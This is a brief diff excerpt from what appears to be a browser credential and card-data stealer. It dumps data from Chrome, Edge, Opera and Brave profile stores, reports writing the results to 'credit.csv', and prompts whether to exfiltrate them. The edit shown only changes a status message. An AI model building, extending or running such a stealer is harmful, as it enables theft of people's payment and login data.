@@ -90,7 +90,7 @@ web_dump(CHROME_PATH_LOCAL_STATE,CHROME_PATH,"chrome.exe","Chrome")
 web_dump(EDGE_PATH_LOCAL_STATE,EDGE_PATH,"msedge.exe", "Edge")
 web_dump(OPERA_PATH_LOCAL_STATE,OPERA_PATH,"opera.exe","Opera")
 web_dump(BRAVE_PATH_LOCAL_STATE,BRAVE_PATH,"brave.exe","Brave")
-print('\n')
+print("[+] Written data to credit.csv\n")
 data.close()
 
 exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
